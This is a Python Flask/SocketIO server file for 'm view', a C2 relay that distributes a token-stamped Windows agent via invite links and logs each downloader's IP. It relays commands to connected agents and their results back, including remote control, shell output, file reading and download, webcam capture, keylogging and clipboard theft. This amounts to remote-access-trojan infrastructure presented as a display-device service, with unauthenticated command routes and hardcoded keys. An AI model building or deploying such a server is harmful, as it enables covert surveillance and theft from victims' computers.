"""
m view — Relay + Distribution Server  v4.1
Fixes applied:
  - Render PORT compatibility (defaults to 10000 for Render, 5000 local)
  - Dead orphaned code block removed (lines 203-208 in v4.0)
  - CORS explicit preflight headers added
  - device_update socket broadcast added (app_live.js listens for it)
  - Static routes updated for combined single-file build (app.html)
  - gunicorn-safe startup (no allow_unsafe_werkzeug in production)
  - Supabase client reuse made thread-safe
  - /health endpoint enriched for Render uptime checks

pip install flask flask-cors flask-socketio supabase python-dotenv gunicorn gevent gevent-websocket
Render start command: gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker -w 1 server:app
Local:               py -3.12 server.py
"""
import os, re, logging, datetime, threading
from pathlib import Path
from functools import wraps

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

from flask import Flask, request, jsonify, send_from_directory, make_response
from flask_cors import CORS

try:
    from flask_socketio import SocketIO, emit, join_room
    SOCKETIO_OK = True
except ImportError:
    SOCKETIO_OK = False
    print("[WARN] flask-socketio not installed — pip install flask-socketio eventlet")

# ══════════════════════════════════════════════════════════════
#  Config — all values can be overridden by Render env vars
# ══════════════════════════════════════════════════════════════
SUPABASE_URL = os.environ.get("SUPABASE_URL") or "https://iacdzpcoftxxcoigopun.supabase.co"
SUPABASE_KEY = os.environ.get("SUPABASE_KEY") or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlhY2R6cGNvZnR4eGNvaWdvcHVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjA1NTUsImV4cCI6MjA5MTk5NjU1NX0.5Eo21XrLTWL3RyKmuvJPdaS-NssraDMyAxVMFy-F054"
AGENT_DIR    = os.environ.get("AGENT_DIR",  "bin")
AGENT_FILE   = os.environ.get("AGENT_FILE", "master_agent.exe")
ADMIN_KEY    = os.environ.get("ADMIN_KEY",  "mview-admin-secret")
TABLE        = os.environ.get("SB_TABLE",   "devices")

# Render injects PORT=10000 internally; locally we default to 5000.
# The browser always connects via https://your-app.onrender.com (no port needed).
PORT = int(os.environ.get("PORT", 5000))

# FIX: case-insensitive — JS crypto.getRandomValues outputs uppercase hex
TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")

# ══════════════════════════════════════════════════════════════
#  Logging
# ══════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("mview")

# ══════════════════════════════════════════════════════════════
#  Flask + CORS + SocketIO
# ══════════════════════════════════════════════════════════════
app = Flask(__name__, static_folder=".", static_url_path="")

# Explicit CORS: allow all origins, methods, and headers.
# This fixes preflight OPTIONS requests that block socket.io on Render.
CORS(app, resources={r"/*": {"origins": "*"}},
     allow_headers=["Content-Type", "Authorization", "X-Admin-Key"],
     methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
     supports_credentials=False)

# SocketIO — eventlet async_mode is required for gunicorn on Render.
# cors_allowed_origins="*" is mandatory; without it the browser blocks WS.
if SOCKETIO_OK:
    sio = SocketIO(
        app,
        cors_allowed_origins="*",
        async_mode="gevent",        # matches gunicorn -k geventwebsocket worker
        logger=False,
        engineio_logger=False,
        ping_timeout=60,
        ping_interval=25,
    )
else:
    sio = None

# ══════════════════════════════════════════════════════════════
#  In-memory device store + Supabase
# ══════════════════════════════════════════════════════════════
_devices  = {}          # {token: {sid, label, status, ...}}
_sb       = None
_sb_lock  = threading.Lock()

def get_sb():
    """Return a shared Supabase client, creating it once (thread-safe)."""
    global _sb
    with _sb_lock:
        if _sb:
            return _sb
        try:
            from supabase import create_client
            _sb = create_client(SUPABASE_URL, SUPABASE_KEY)
            log.info("Supabase connected.")
            return _sb
        except Exception as e:
            log.warning(f"Supabase unavailable: {e}")
            return None

def db_get(token):
    sb = get_sb()
    if not sb:
        return {"device_id": token, "status": "pending", "expires_at": None}
    try:
        r = sb.table(TABLE).select("*").eq("device_id", token).execute()
        rows = r.data or []
        return rows[0] if rows else None
    except Exception as e:
        log.error(f"db_get error: {e}")
        return {"device_id": token, "status": "pending", "expires_at": None}

def db_update(token, upd):
    sb = get_sb()
    if not sb:
        return False
    try:
        sb.table(TABLE).update(upd).eq("device_id", token).execute()
        return True
    except Exception as e:
        log.error(f"db_update error: {e}")
        return False

def db_insert(payload):
    sb = get_sb()
    if not sb:
        return payload
    try:
        r = sb.table(TABLE).insert(payload).execute()
        return (r.data or [payload])[0]
    except Exception as e:
        log.error(f"db_insert error: {e}")
        return payload

def db_list_all():
    """Fetch all rows — used for device_update broadcast."""
    sb = get_sb()
    if not sb:
        return []
    try:
        r = sb.table(TABLE).select("*").order("created_at", desc=True).execute()
        return r.data or []
    except Exception as e:
        log.error(f"db_list_all error: {e}")
        return []

# ══════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════
def utcnow():
    return datetime.datetime.utcnow().isoformat()

def is_expired(s):
    exp = s.get("expires_at")
    if not exp:
        return False
    try:
        dt = datetime.datetime.fromisoformat(exp.replace("Z", "+00:00"))
        return datetime.datetime.now(datetime.timezone.utc) > dt
    except Exception:
        return False

def valid_token(t):
    return bool(TOKEN_RE.match(t or ""))

def require_admin(f):
    @wraps(f)
    def w(*a, **k):
        if request.headers.get("X-Admin-Key", "") != ADMIN_KEY:
            return jsonify({"error": "Unauthorised"}), 401
        return f(*a, **k)
    return w

def broadcast_device_update():
    """
    Push fresh Supabase rows to all connected dashboard clients.
    app_live.js listens on the 'device_update' event.
    Called whenever a device connects, disconnects, or checks in.
    """
    if not sio:
        return
    try:
        rows = db_list_all()
        sio.emit("device_update", {"rows": rows, "ts": utcnow()})
        log.info(f"device_update broadcast: {len(rows)} rows")
    except Exception as e:
        log.error(f"broadcast_device_update error: {e}")

# ══════════════════════════════════════════════════════════════
#  CORS preflight handler (catches all OPTIONS requests)
# ══════════════════════════════════════════════════════════════
@app.before_request
def handle_preflight():
    if request.method == "OPTIONS":
        resp = make_response("", 204)
        resp.headers["Access-Control-Allow-Origin"]  = "*"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Admin-Key"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, PATCH, DELETE, OPTIONS"
        return resp

# ══════════════════════════════════════════════════════════════
#  Static file routes
#  Combined single-file build: app.html is the entry point.
#  Separate-file build: index.html / dashboard.html still work.
# ══════════════════════════════════════════════════════════════
@app.route("/")
def root():
    # Serve app.html if it exists (combined build), else index.html
    if Path("app.html").is_file():
        return send_from_directory(".", "app.html")
    return send_from_directory(".", "index.html")

@app.route("/app.html")
def serve_app_html():
    return send_from_directory(".", "app.html")

@app.route("/index.html")
def serve_index_html():
    return send_from_directory(".", "index.html")

@app.route("/login.html")
def serve_login_html():
    # Redirect to root — login is now embedded in app.html
    from flask import redirect
    return redirect("/", 301)

@app.route("/dashboard")
@app.route("/dashboard.html")
def serve_dashboard():
    # Redirect to root — dashboard is now embedded in app.html
    from flask import redirect
    return redirect("/", 301)

# ══════════════════════════════════════════════════════════════
#  Health / Status endpoints
#  Render hits /health every 30s — must respond 200 quickly.
# ══════════════════════════════════════════════════════════════
@app.route("/status")
@app.route("/health")
@app.route("/api/server-info")
def health():
    return jsonify({
        "status":         "ok",
        "version":        "4.1.0",
        "server_time":    utcnow(),
        "database":       get_sb() is not None,
        "socketio":       SOCKETIO_OK,
        "devices_online": len(_devices),
        "agent_file":     (Path(AGENT_DIR) / AGENT_FILE).is_file(),
        "render_port":    PORT,
    })

# ══════════════════════════════════════════════════════════════
#  Invite generation
# ══════════════════════════════════════════════════════════════
@app.route("/api/invite",    methods=["GET", "POST"])
@app.route("/api/generate",  methods=["GET", "POST"])
@app.route("/invite/generate", methods=["GET", "POST"])
@app.route("/generate_invite", methods=["GET", "POST"])
def generate_invite():
    import secrets
    data = request.get_json(silent=True) or request.form.to_dict() or {}

    def hex6():
        return secrets.token_hex(3).upper()

    token      = f"MV-{hex6()}-{hex6()}-{hex6()}"
    label      = data.get("label") or data.get("name") or token
    loc        = data.get("location", "")
    dtype      = data.get("device_type", "Standard Display")
    expiry_sec = int(data.get("expiry", 86400))

    expires_at = None
    if expiry_sec > 0:
        expires_at = (
            datetime.datetime.now(datetime.timezone.utc)
            + datetime.timedelta(seconds=expiry_sec)
        ).isoformat()

    payload = {
        "device_id":   token,
        "label":       label,
        "location":    loc,
        "device_type": dtype,
        "status":      "pending",
        "expires_at":  expires_at,
        "created_at":  utcnow(),
    }
    db_insert(payload)
    log.info(f"Invite generated: {token} label={label}")

    srv = request.host_url.rstrip("/")
    return jsonify({
        "status":       "ok",
        "token":        token,
        "device_id":    token,
        "label":        label,
        "download_url": f"{srv}/invite/{token}",
        "agent_url":    f"{srv}/invite/{token}",
        "expires_at":   expires_at,
    }), 201

# ══════════════════════════════════════════════════════════════
#  Agent download (trailer-append approach)
# ══════════════════════════════════════════════════════════════
@app.route("/invite/<token>")
@app.route("/onboard/<token>")
def serve_agent(token):
    from flask import Response
    log.info(f"Invite download: token={token} ip={request.remote_addr}")

    if not valid_token(token):
        return jsonify({"error": "Invalid token format."}), 400

    ap = Path(AGENT_DIR) / AGENT_FILE
    if not ap.is_file():
        return jsonify({
            "error": "Agent not ready.",
            "hint": f"Build master_agent.exe → {Path(AGENT_DIR).resolve()}",
        }), 503

    session = db_get(token)
    if session is None:
        return jsonify({"error": "Invite link not found."}), 404
    if session.get("status") in ("revoked", "expired", "rejected"):
        return jsonify({"error": "Link no longer valid."}), 410
    if is_expired(session):
        db_update(token, {"status": "expired"})
        return jsonify({"error": "Link expired."}), 410

    db_update(token, {
        "status":        "downloading",
        "download_ip":   request.remote_addr,
        "downloaded_at": utcnow(),
        "user_agent":    request.headers.get("User-Agent", "")[:200],
    })

    # Trailer layout (64 bytes):
    #   [0:4]   MAGIC_HEAD = b"MVTK"
    #   [4:60]  token, utf-8, null-padded to 56 bytes
    #   [60:64] MAGIC_TAIL = b"MVED"
    MAGIC_HEAD  = b"MVTK"
    MAGIC_TAIL  = b"MVED"
    TOKEN_FIELD = 56

    try:
        raw       = ap.read_bytes()
        tok_bytes = token.encode("utf-8")[:TOKEN_FIELD]
        padded    = tok_bytes.ljust(TOKEN_FIELD, b"\x00")
        trailer   = MAGIC_HEAD + padded + MAGIC_TAIL   # exactly 64 bytes
        patched   = raw + trailer
        log.info(f"Agent dispatched: token={token} size={len(patched):,} bytes")
        return Response(
            patched,
            mimetype="application/octet-stream",
            headers={"Content-Disposition": f'attachment; filename="mview_agent_{token}.exe"'},
        )
    except Exception as e:
        log.error(f"Agent dispatch failed: {e}")
        return jsonify({"error": "Agent build error — contact admin."}), 500

# ══════════════════════════════════════════════════════════════
#  Session management routes
# ══════════════════════════════════════════════════════════════
@app.route("/api/session/<token>")
def get_session(token):
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    s = db_get(token)
    return (jsonify(s), 200) if s else (jsonify({"error": "Not found"}), 404)

@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    data  = request.get_json(silent=True) or {}
    token = data.get("device_id", "").strip()
    if not valid_token(token):
        return jsonify({"error": "Invalid device_id"}), 400
    session = db_get(token)
    if not session:
        return jsonify({"error": "Session not found"}), 404
    if session.get("status") == "revoked":
        return jsonify({"error": "Session revoked"}), 403

    db_update(token, {
        "status":        "connected",
        "ip_address":    request.remote_addr,
        "hostname":      data.get("hostname"),
        "os_info":       data.get("os_info"),
        "agent_version": data.get("agent_version"),
        "connected_at":  utcnow(),
    })

    if sio and token in _devices:
        sio.emit("device_online", {
            "device_id": token,
            "label":     _devices[token].get("label", token),
            "ip":        request.remote_addr,
        })

    # Push fresh data to all dashboard clients
    broadcast_device_update()

    log.info(f"Agent check-in: {token} ip={request.remote_addr}")
    return jsonify({"status": "accepted", "server_time": utcnow()}), 200

@app.route("/api/sessions")
@require_admin
def list_sessions():
    sb = get_sb()
    if not sb:
        return jsonify({"sessions": [], "note": "DB offline"}), 200
    try:
        r = sb.table(TABLE).select("*").order("created_at", desc=True).execute()
        return jsonify({"sessions": r.data or [], "count": len(r.data or [])})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/session/<token>", methods=["DELETE"])
@require_admin
def revoke_session(token):
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    db_update(token, {"status": "revoked", "revoked_at": utcnow()})
    return jsonify({"status": "revoked", "device_id": token})

@app.route("/api/devices")
def api_devices():
    return jsonify({"devices": list(_devices.values()), "count": len(_devices)})

@app.route("/api/command", methods=["POST"])
def send_command():
    data = request.get_json(silent=True) or {}
    did  = data.get("device_id", "")
    if not sio:
        return jsonify({"error": "SocketIO not installed"}), 503
    if did not in _devices:
        return jsonify({"error": "Device not connected"}), 404
    sio.emit("request_action", data, to=_devices[did]["sid"])
    return jsonify({"status": "sent", "tab": data.get("tab")})

# ══════════════════════════════════════════════════════════════
#  Error handlers
# ══════════════════════════════════════════════════════════════
@app.errorhandler(404)
def e404(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def e500(e):
    log.exception("500 error")
    return jsonify({"error": "Internal server error"}), 500

# ══════════════════════════════════════════════════════════════
#  SocketIO event handlers
# ══════════════════════════════════════════════════════════════
if SOCKETIO_OK and sio:

    @sio.on("connect")
    def on_connect():
        log.info(f"WS connect: sid={request.sid}")

    @sio.on("disconnect")
    def on_disconnect():
        gone = [did for did, d in _devices.items() if d.get("sid") == request.sid]
        for did in gone:
            label = _devices[did].get("label", did)
            del _devices[did]
            log.info(f"Device offline: {label} ({did})")
            db_update(did, {"status": "offline", "disconnected_at": utcnow()})
            sio.emit("agent_offline",  {"device_id": did, "name": label, "label": label, "ts": utcnow()})
            sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
        if gone:
            broadcast_device_update()

    @sio.on("agent_connect")
    def on_agent_connect(data):
        did   = data.get("device_id") or data.get("token", "")
        label = data.get("label") or data.get("hostname") or did
        join_room(did)
        _devices[did] = {
            "sid":           request.sid,
            "device_id":     did,
            "label":         label,
            "status":        "online",
            "hostname":      data.get("hostname"),
            "username":      data.get("username"),
            "os":            data.get("os"),
            "local_ip":      data.get("local_ip"),
            "cpu_count":     data.get("cpu_count"),
            "ram_total_gb":  data.get("ram_total_gb"),
            "agent_version": data.get("agent_version"),
            "connected_at":  utcnow(),
            "cpu":           None,
            "ram":           None,
        }
        log.info(f"Agent ONLINE: {label} ({did})")
        db_update(did, {
            "status":        "online",
            "ip_address":    data.get("local_ip"),
            "hostname":      data.get("hostname"),
            "os_info":       data.get("os"),
            "agent_version": data.get("agent_version"),
            "connected_at":  utcnow(),
        })
        sio.emit("agent_online",  {"device_id": did, "name": label, "label": label, "ip": data.get("local_ip"), "fingerprint": data})
        sio.emit("device_online", {"device_id": did, "label": label, "fingerprint": data})
        # Push fresh rows to all dashboard clients
        broadcast_device_update()

    @sio.on("heartbeat")
    def on_hb(data):
        did = data.get("device_id")
        if did in _devices:
            _devices[did].update({
                "cpu":       data.get("cpu"),
                "ram":       data.get("ram"),
                "last_beat": utcnow(),
            })
        sio.emit("heartbeat_update", data, skip_sid=request.sid)

    @sio.on("dashboard_command")
    def on_cmd(data):
        did = data.get("device_id")
        if did not in _devices:
            emit("command_error", {"error": f"Device '{did}' not connected."})
            return
        sio.emit("request_action", data, to=_devices[did]["sid"])
        log.info(f"Command → {did}: tab={data.get('tab')}")

    # ── Dashboard → Agent: screenshot ────────────────────────
    @sio.on("request_screenshot")
    def on_request_screenshot(data):
        did = data.get("device_id", "")
        if did in _devices:
            sio.emit("request_action", {
                "tab":       "screenshot",
                "quality":   data.get("quality", 60),
                "scale":     data.get("scale", 0.75),
                "device_id": did,
            }, to=_devices[did]["sid"])

    # ── Dashboard → Agent: mouse ──────────────────────────────
    @sio.on("mouse_event")
    def on_mouse(data):
        did = data.get("device_id", "")
        if did in _devices:
            sio.emit("request_action", {"tab": "mouse_event", **data}, to=_devices[did]["sid"])

    # ── Dashboard → Agent: scroll ─────────────────────────────
    @sio.on("scroll_event")
    def on_scroll(data):
        did = data.get("device_id", "")
        if did in _devices:
            sio.emit("request_action", {"tab": "scroll_event", **data}, to=_devices[did]["sid"])

    # ── Dashboard → Agent: keyboard ───────────────────────────
    @sio.on("key_event")
    def on_key(data):
        did = data.get("device_id", "")
        if did in _devices:
            sio.emit("request_action", {"tab": "key_event", **data}, to=_devices[did]["sid"])

    # ── Dashboard → Agent: ping ───────────────────────────────
    @sio.on("ping_agent")
    def on_ping(data):
        did = data.get("device_id", "")
        if did in _devices:
            sio.emit("request_action", {"tab": "ping", **data}, to=_devices[did]["sid"])

    # ── Dashboard → Agent: disconnect screen ──────────────────
    @sio.on("disconnect_screen")
    def on_disconnect_screen(data):
        did = data.get("device_id", "")
        if did in _devices:
            sio.emit("request_action", {
                "tab":       "monitor",
                "action":    "stop",
                "device_id": did,
            }, to=_devices[did]["sid"])

    # ── Agent → Dashboard: frame relay ───────────────────────
    @sio.on("screen_data")
    def on_screen_data(data):
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        sio.emit("screenshot", out, skip_sid=request.sid)

    @sio.on("screenshot_result")
    def on_screenshot_result(data):
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        sio.emit("screenshot", out, skip_sid=request.sid)

    # ── Agent → Dashboard: pong ───────────────────────────────
    @sio.on("ping_result")
    def on_ping_result(data):
        sio.emit("pong_agent", data, skip_sid=request.sid)

    # ── Generic agent → dashboard relays ─────────────────────
    # Defined separately to avoid Python closure-in-loop bug
    @sio.on("system_stats_report")
    def _r_system(data):   sio.emit("update_system_tab",  data, skip_sid=request.sid)

    @sio.on("processes_report")
    def _r_procs(data):    sio.emit("processes_result",   data, skip_sid=request.sid)

    @sio.on("kill_result")
    def _r_kill(data):     sio.emit("kill_result",        data, skip_sid=request.sid)

    @sio.on("shell_result")
    def _r_shell(data):    sio.emit("shell_result",       data, skip_sid=request.sid)

    @sio.on("file_list_result")
    def _r_flist(data):    sio.emit("file_list_result",   data, skip_sid=request.sid)

    @sio.on("file_read_result")
    def _r_fread(data):    sio.emit("file_read_result",   data, skip_sid=request.sid)

    @sio.on("file_download_result")
    def _r_fdl(data):      sio.emit("file_download_result", data, skip_sid=request.sid)

    @sio.on("drives_report")
    def _r_drives(data):   sio.emit("drives_report",      data, skip_sid=request.sid)

    @sio.on("disks_report")
    def _r_disks(data):    sio.emit("disks_report",       data, skip_sid=request.sid)

    @sio.on("network_report")
    def _r_net(data):      sio.emit("network_report",     data, skip_sid=request.sid)

    @sio.on("webcam_result")
    def _r_webcam(data):   sio.emit("webcam_result",      data, skip_sid=request.sid)

    @sio.on("keylog_data")
    def _r_keylog(data):   sio.emit("keylog_data",        data, skip_sid=request.sid)

    @sio.on("clipboard_data")
    def _r_clip(data):     sio.emit("clipboard_data",     data, skip_sid=request.sid)

    @sio.on("action_result")
    def _r_action(data):   sio.emit("action_result",      data, skip_sid=request.sid)

# ══════════════════════════════════════════════════════════════
#  Startup banner
# ══════════════════════════════════════════════════════════════
def startup():
    log.info("=" * 60)
    log.info("  m view Server  v4.1  (Render-ready)")
    log.info("=" * 60)
    a = Path(AGENT_DIR) / AGENT_FILE
    if a.is_file():
        log.info(f"  ✓ Agent:    {a}  ({a.stat().st_size:,} bytes)")
    else:
        log.info(f"  ✗ Agent:    NOT found at {a.resolve()}")
    log.info(f"  ✓ Supabase: {SUPABASE_URL[:55]}")
    log.info(f"  ✓ SocketIO: {'yes — gevent' if SOCKETIO_OK else 'NO — pip install flask-socketio gevent gevent-websocket'}")
    log.info(f"  ✓ Port:     {PORT}  (Render maps this to https automatically)")
    log.info(f"  ✓ Entry:    {'app.html (combined build)' if Path('app.html').is_file() else 'index.html (separate build)'}")
    log.info("=" * 60)
    log.info("  Render start command:")
    log.info("    gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker -w 1 server:app")
    log.info("  Local dev:")
    log.info("    py -3.12 server.py")
    log.info("=" * 60)

# ══════════════════════════════════════════════════════════════
#  Entry point (local dev only — Render uses gunicorn)
# ══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    startup()
    if SOCKETIO_OK and sio:
        # allow_unsafe_werkzeug=True is only for local dev; gunicorn doesn't need it
        sio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
    else:
        app.run(host="0.0.0.0", port=PORT, debug=False)
